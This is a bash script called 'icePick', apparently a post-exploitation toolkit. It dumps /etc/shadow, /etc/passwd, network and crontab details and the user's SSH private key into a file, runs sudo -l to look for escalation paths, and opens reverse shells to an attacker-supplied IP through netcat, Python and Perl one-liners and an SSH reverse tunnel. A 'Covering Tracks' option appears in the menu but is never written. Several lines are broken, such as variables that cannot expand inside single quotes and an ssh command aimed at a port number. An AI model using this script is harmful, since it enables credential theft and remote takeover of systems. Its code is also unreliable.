#!/bin/bash
echo Welcome to icePick

function menu(){
	local choice = null
	echo Your options
	echo 1\) Information
	echo 2\) Escilation
	echo 3\) Reverse shells
	echo 4\) Covering Tracks
	read choice

	case $choice in
		1)
			Information
			;;
		2)
			Escilation
			;;
		3)
			shells
			;;
		4)
			hide
			;;
	esac
}

function Information() {
	echo Please enter the path you would like the output placed
	read path
	echo What would you like the output called\?
	read output

	touch $output

	#System
			cat /etc/shadow >> /$path/$output #shadow file with password hashes
			cat /etc/motd  >> /$path/$output #message of the day
			cat /etc/issue  >> /$path/$output #lists version of OS
			cat /etc/passwd  >> /$path/$output #lists user list. 
			uname -a  >> /$path/$output # Kernel version
			ps aux  >> /$path/$output #list all running processes
			id  >> /$path/$output #current usename and groups
			w  >> /$path/$output #who is connected
			last -a  >> /$path/$output #last users logged in
			dmesg  >> /$path/$output #information from last boot
			lsusb  >> /$path/$output #lists USB buses and devices
			df -k  >> /$path/$output #mounted filesystem and mount points
	#Network
			iptables -L -n -V >> /$path/$output #shows iptables in readable format
			cat /etc/resolv.conf >> /$path/$output 
			hostname -f  >> /$path/$output # lists hostname
			ip addr show  >> /$path/$output #lists ip address, new IFCONFIG
			route -n  >> /$path/$output #shows routing table
			cat /etc/network/interfaces  >> /$path/$output #lists interfaces
			netstat -anop  >> /$path/$output #shows connections
	#Users
			cat /etc/passwd	 >> /$path/$output #user list
			cat /etc/aliases  >> /$path/$output #lists aliases
	#Credentials
			/home/$USER/.ssh/id_rsa  >> /$path/$output #lists ssh keys
			cat /etc/crontab >> /$path/$output 
	#Installed packages
			rpm -qa --last |head  >> /$path/$output #red hat
			yum list |grep installed  >> /$path/$output #fedora
			dpkg -l  >> /$path/$output #debian
			pkg_info  >> /$path/$output #BSD
			pkginfo  >> /$path/$output #solaris
			pacman -Q  >> /$path/$output #arch
}
function Escilation(){
	sudo -l #shows the sudo files to indentify possible escilaitons.
}
function shells(){
	local choice = null
	echo What is the IP of your remote host\?
	read IP
	echo What port \do you want to use\?
	read port

	echo What shell would you like to \set up\?
	echo 1\) NetCat \/bin\/sh
	echo 1a\) NetCat \/bin\/bash
	echo 2\) Python
	echo 3\) Perl
	echo 4\) SSH
	read $choice

	case $choice in
		1)
			nc -e /bin/sh $IP $port
			;;
		1a)
			nc -e /bin/bash $IP $port
			;;
		2)
			python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$IP","$port"));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
			;;
		3)
			perl -e 'use Socket;$i="$IP";$p=$port;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
			;;
		4)
			echo What is the remote user name\?
			read Ruser
			ssh -NR $port:localhost:22 $Ruser@$port
			;;
	esac

}
menu